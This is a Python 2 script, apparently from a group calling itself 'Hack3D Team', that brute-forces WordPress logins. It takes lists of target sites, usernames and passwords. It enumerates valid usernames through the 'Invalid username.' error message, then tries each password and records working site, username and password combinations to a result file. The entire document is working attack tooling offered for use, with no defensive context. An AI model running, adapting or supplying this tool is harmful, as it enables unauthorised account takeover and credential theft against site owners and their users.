#!/usr/bin/python
import sys, re, urllib, time, urllib2 ;
print '''
    ###################################################
    # Author: MasTerChO || Hack3D Team                #
    # Description : Brute Force [ WordPress ]         #
    # File : %s                                       #
    ###################################################
    \n\n'''% sys.argv[0];
if len(sys.argv) <= 1:
        print "\n|----------------------------------------------"
        print "|    - Brute Force [ WordPress ]               "
        print "|      Usage: pyhton %s --help                   "% sys.argv[0];
        print "|----------------------------------------------\n"
        sys.exit(1)
try:
    output = "result.txt";
    error_user = "Invalid username.";
    error_pass = "ERROR";
    for arg in sys.argv:
        if arg == "--help":
                print "\n   Usage: %s [options]"% sys.argv[0];
                print "\t: -h       sitelist.txt"
                print "\t: -u       userlist.txt"
                print "\t: -p       passlist.txt"
                print "\t: -o       result.txt"
                print "\n   Ex: python %s -h sitelist -u userlist.txt -p passlist.txt -o result.txt"% sys.argv[0];
                sys.exit(1)
    print '\n================================================================\n';
    tar = "";
    count = 0;
    for arg in sys.argv:
        if arg == "-h":
            tar = sys.argv[count+1];
        elif arg == "-u":
            userlist = sys.argv[count+1];
        elif arg == "-p":
            passlist = sys.argv[count+1];
        elif arg == "-o":
            output = sys.argv[count+1];
        count +=1;
    try:
        f1 = open(tar).readlines();
        f2 = open(userlist).readlines();
        f3 = open(passlist).readlines();
        f4 = open(output, "a");
    except IOError:
        print "\n [-]No such File ! .\n";
        sys.exit();
    print "[+] Targets Loaded: ",len(f1);
    print "[+] Usernames Loaded: ",len(f2);
    print "[+] Passwords Loaded: ",len(f3);
    print '\n================================================================\n';
    if tar == "":
        print "[-] Must include -h sitelist\n";
        print "[-] For help --help\n";
        sys.exit(1);
    for site in f1:
        site1 = site.replace("\r\n","")
        gg = 1;
        print "\nsite:%s.....\n"% site1
        for usr in f2:
            if gg != 1: break;
            usr2 = usr.replace("\n","");
            getu = 0;
            time.sleep(1);
            host = urllib2.Request(site1);
            inp = urllib.urlencode({"log":usr2,"pwd":"MasTerChO",
                                    "wp-submit":"forever"});
            try:
                page = urllib2.urlopen(host, inp);
                chek = page.read();
                msg = re.search(error_user, chek);
                if not msg and usr2 != "":
                    print '\n\n[+]site : %s username : %s ' % (site1,usr2);
                    print "\n";
                    getu = 1;
                    f4.write("\n[+] BruteForcing: "+str(site1));
                    f4.write("\n[+] UserName: "+str(usr2));
                    for pas in f3:
                            pas2 = pas.replace("\n","");
                            getp = 0;
                            time.sleep(1);
                            host2 = urllib2.Request(site1);
                            inp2 = urllib.urlencode({"log":usr2,"pwd":pas2,
                                                    "wp-submit":"forever"});
                            try:
                                page2 = urllib2.urlopen(host2, inp2);
                                chek2 = page2.read();
                                msg2 = re.search(error_pass, chek2);
                                if not msg2:
                                    print '\n\n\t[+] password : %s ' % pas2;
                                    print "\n";
                                    print "\n[+]Site : %s [+]Username :  %s Password : %s \n\n"% (site1,usr2,pas2);
                                    print "\n";
                                    getp = 1;
                                    gg = 0;
                                    f4.write("\n[+] PassWord: "+str(pas2));
                                    break;
                                else:
                                    print '[-] password : %s ' % pas2;
                                    gg = 1
                            except urllib2.URLError:
                                print "\n\nNot found => %s \n"% site1;
                                break;
                                pass;
                else:
                    print '[-] username : %s ' % usr2;
            except urllib2.URLError:
                print "\n\tNot found => %s \n"% site1
                break;
                pass;            
except KeyboardInterrupt:
    print "\n\n[-] >>break !! \n\n";
    sys.exit();